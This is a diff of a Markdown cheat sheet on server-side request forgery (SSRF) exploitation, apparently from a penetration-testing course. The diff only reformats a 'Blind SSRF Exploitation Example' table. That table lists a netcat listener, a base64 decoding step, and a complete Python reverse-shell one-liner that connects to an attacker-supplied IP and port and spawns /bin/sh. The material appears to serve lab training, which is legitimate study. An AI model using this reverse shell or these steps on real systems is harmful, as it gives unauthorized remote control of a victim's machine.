@@ -1,3 +1,4 @@
+
 ## SSRF Exploitation Example
 
 |**Command**|**Description**|
@@ -24,8 +25,9 @@
 
 ## Blind SSRF Exploitation Example
 
-|**Command**|**Description**|
-|---|---|
-|`nc -lvnp 9090`|Starting a netcat listener|
-|`echo """<B64 encoded response>""" \| base64 -d`|Decoding the base64 encoded response|
-|`export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`|
+| **Command**                                                                                                                                                                                                                        | **Description**                      |
+| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------ |
+| `nc -lvnp 9090`                                                                                                                                                                                                                    | Starting a netcat listener           |
+| `echo """<B64 encoded response>""" \| base64 -d`                                                                                                                                                                                   | Decoding the base64 encoded response |
+| `export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'` |                                      |
+
